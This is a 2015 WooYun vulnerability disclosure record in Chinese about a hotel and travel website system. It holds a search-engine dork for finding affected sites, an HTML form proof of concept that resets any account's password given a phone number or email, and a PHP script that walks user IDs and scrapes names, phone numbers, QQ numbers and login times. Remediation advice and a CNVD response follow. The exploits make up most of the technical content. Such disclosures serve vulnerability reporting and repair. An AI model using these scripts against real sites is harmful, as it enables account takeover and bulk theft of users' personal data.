{"id": 70701, "wybug_id": "wooyun-2015-0133190", "wybug_title": "某旅游系统逻辑缺陷导致大量用户信息泄漏任意密码修改+验证脚本", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-08-15 22:55", "wybug_open_date": "2015-10-02 09:56", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向公众公开  简要描述： 吓死宝宝了 详细说明：  通用型漏洞关键字：\ninurl:\"HotelManager/GetTopHotels.aspx\"\n涉及网站：\n**.**.**.**    华中自助游网**.**.**.**     恩施旅游网**.**.**.**     恩施硒都酒店联盟...\n0x01  任意密码修改输入网站会员手机号或者邮箱，可直接修改密码请看POC(修改POC里Form的Action地址以修改请求目标):\n<html><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><p>\t填入目标的电话号码或者邮箱 点击重置密码 即可重置任意帐户密码</p><br><form action=\"http://**.**.**.**/Profile.aspx/reset\" method=\"POST\">\t电　话：<input type=\"text\" name=\"p$ctl00$txtMobile\" value=\"\"><br>\t邮　箱：<input type=\"text\" name=\"p$ctl00$txtEmail\" value=\"\"><br>\t<!--在找回密码的页面获得有效的__EVENTVALIDATION和__VIEWSTATE可以多次利用-->\t<input type=\"hidden\" name=\"__EVENTVALIDATION\" value=\"/wEWBAKZweC1BwKrptGYCQKrsdfTAwL3m/b3B0Ggi/pDHSRG4MTpcgdY8b+3YgX5\">\t<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"/wEPDwUKLTQ4MjY3NjUwMGRks9mYI1u+YGSLVwr6TWcZFFwmZyk=\">\t<input type=\"submit\" name=\"p$ctl00$btnReset\" value=\"重置密码\"><br></form></html>\n修改成功！\n\n0x02 用户信息遍历存在问题的接口\nhttp://{domain}/profile.aspx/view/{UID}\n请看POC：\n<?php/*******************************************        权限配置不当，可遍历，可脱裤********************************************/header(\"content-type:text/html;charset=utf-8\");array_shift($argv); $Url = \"http://\".$argv[0].\"/profile.aspx/view/\";$Uid=$argv[1];$ids = '';$ide = '';if($Url&&$Uid){\t$Uid = explode('-',$argv[1]);\t$ids = $Uid[0];\t$ide = $Uid[1];    echo \"[+]  Starting Target:\".$argv[0].\" Uid :\".$argv[1].\" at  \".date(\"Y-m-d H:i:s\").\"\\r\\n\";\techo b(\"[+]  [ UID:用户ID ==> 帐户ID----姓名----电话号码----QQ号码----注册时间----最后登录时间 ]\\r\\n\");\tfor ($i=$ids; $i <= $ide; $i++) { \t\t$c = file_get_contents($Url.$i);\t\t$c = b($c);\t\t$Account = getSubstr($c,\"p_ctl00_lblUsername\\\">\",\"</span>\");\t\t$Name = getSubstr($c,\"p_ctl00_lblFirstname\\\">\",\"</span>\");\t\t$Phone = getSubstr($c,\"p_ctl00_lblMobilePhoe\\\">\",\"</span>\");\t\t$QQ = getSubstr($c,\"p_ctl00_lblQQ\\\">\",\"</span>\");\t\t$RegsiterTime = getSubstr($c,\"p_ctl00_lblRegisteredOn\\\">\",\"</span>\");\t\t$LastLoginTime = getSubstr($c,\"p_ctl00_lblLastLogin\\\">\",\"</span>\");\t\tif(!$Account)\t\t{\t\t\techo \"UID: \".$i.\" ==> Wrong Uid\\r\\n\";\t\t\tcontinue;\t\t}\t\tif($QQ == '')\t\t{\t\t\t$QQ = \"Null\";\t\t}\t\tif($LastLoginTime == '')\t\t{\t\t\t$LastLoginTime = \"Null\";\t\t}\t\techo \"       UID: \".$i.\" ==> \".$Account.\"----\".$Name.\"----\".$Phone.\"----\".$QQ.\"----\".$RegsiterTime.\"----\".$LastLoginTime.\"\\r\\n\";\t\t\t}\techo \"[+]  Done.\";}else {\techo \"\t[+]  Usage: \t[+]  exp.php Url StartUserID-EndUserID\t[+]  For Example: exp.php http://**.**.**.** 1-10\";}function getSubstr($str, $leftStr, $rightStr)  //取出中间文本内容{    $left = strpos($str, $leftStr);    $right = strpos($str, $rightStr,$left);    if($left < 0 or $right < $left) return '';    return substr($str, $left + strlen($leftStr), $right-$left-strlen($leftStr));}function b($s) //解决中文乱码{\treturn iconv(\"utf-8\",\"gb2312//IGNORE\",$s);}?>\n\n\n   漏洞证明：  获得电话号码就能重置密码 0x01+0x02双剑合璧看看影响了多少用户华中自助游目前已有 18658 名用户受影响\n\n恩施酒店联盟目前已有 9169 名用户受影响\n\n来看看\"脱裤\"的情况：网站+用户ID范围\n\n\n\n\n\n批量获取用户手机号或电话 ，直接可以强制更改密码至此 仅测试前5名用户的信息采集 以及 探测最大用户量，未进行整站脱裤快点修复吧..   >_<  我还没批...     修复方案：  只是简单测试了一下  就有这么多问题 1.用户密码找回应有二次校验2.加验证码防止页面数据重复提交以被利用3.权限  权限  权限  .. 平行权限的危害是非常大的4.提不提交是一种态度，修不修复就是您的态度了   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-18 09:54 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商（或网站管理单位）的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}